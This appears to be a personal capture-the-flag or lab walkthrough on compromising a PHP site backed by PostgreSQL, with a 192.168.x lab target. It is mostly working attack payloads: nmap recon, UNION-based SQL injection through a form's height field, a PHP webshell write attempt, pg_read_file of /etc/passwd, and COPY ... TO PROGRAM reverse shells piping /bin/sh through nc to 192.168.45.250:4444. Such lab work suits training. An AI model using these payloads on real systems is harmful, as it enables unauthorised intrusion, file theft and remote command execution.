```bash
# IP: 192.168.199.49

# Reconnaissance
sudo nmap -sV -sC -v 192.168.199.49
	# OS: Linux (Debian 11)
	# 22: SSH
	# 80: HTTP
	# 5432: PostgreSQL

# Manual Reconnaissance
	# Uses PHP
	# User inputs: 
		# Contact -- Likely deadend
		# Sign Up for classes: Yes!
		# Newsletter

# Sign Up for classes
# Trying to idenitfy vulnerable field
```
![[Pasted image 20250315114931.png]]

```bash
# Email seems Vulnerable
select * from users where email like '%&lt;&gt;!&quot;'%'         '

# Building the SQL query
' ORDER BY 6-- //                          '
	# Doesn't work

# Actually seems like the Height field is vulnerable
```
![[Pasted image 20250315115309.png]]

```bash
# Finding the right amount of columns
weight=<>!"aaa'&height=' ORDER BY 6-- //&age=<>!"ccc'&gender=<>!"ddd'&email=idk # Works
weight=<>!"aaa'&height=' ORDER BY 7-- //&age=<>!"ccc'&gender=<>!"ddd'&email=idk # Breaks
	# 6 columns total

# Trying to upload a webshell :]
weight=198&age=<>!"ccc'&gender=<>!"ddd'&email=idk&height=' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
	# Doesn't seem to work

# Trying to display the version for example
weight=198&age=<>!"ccc'&gender=<>!"ddd'&email=idk&height=' UNION SELECT null, version(), null, null, null, null -- //
	# Doesn't work because of data type error
	 
# Trying to move the version around
weight=198&age=<>!"ccc'&gender=<>!"ddd'&email=idk'--&height=' UNION SELECT null,  null, null, null, null, null -- //

weight=198&age=<>!"ccc'&gender=<>!"ddd'&email=idk'--&height=' UNION SELECT 
lo_export(
  (SELECT convert_from(pg_read_file('/etc/passwd'), 'UTF8')), 
  '/var/www/html/pwd'
),
null, SELECT 98, null, null, null -- //

lo_export(
  (SELECT convert_from(pg_read_file('/etc/passwd'), 'UTF8')), 
  '/var/www/html/pwd'
)

# Best payload so far
weight=198&age=<>!"ccc'&gender=<>!"ddd'&email=idk'--&height=' UNION SELECT
null, 
null, 
null, 
null,
null,
null; CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.250 4444 >/tmp/f'; -- //

COPY (SELECT '') to PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.250 4444 >/tmp/f'; -- //

# Excellent website: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md

# Sleep:
(CAST((select 1 from pg_sleep(5)) AS TEXT)),

# Final payload!:
weight=198&age=25&gender=Other&email=RGPD&height=12'; COPY (SELECT '') to PROGRAM 'nc -c sh 192.168.45.250 4444'; -- //                '

# Reverse Shell & Find the flag
find / -name "flag.txt"
```
![[Pasted image 20250315141923.png]]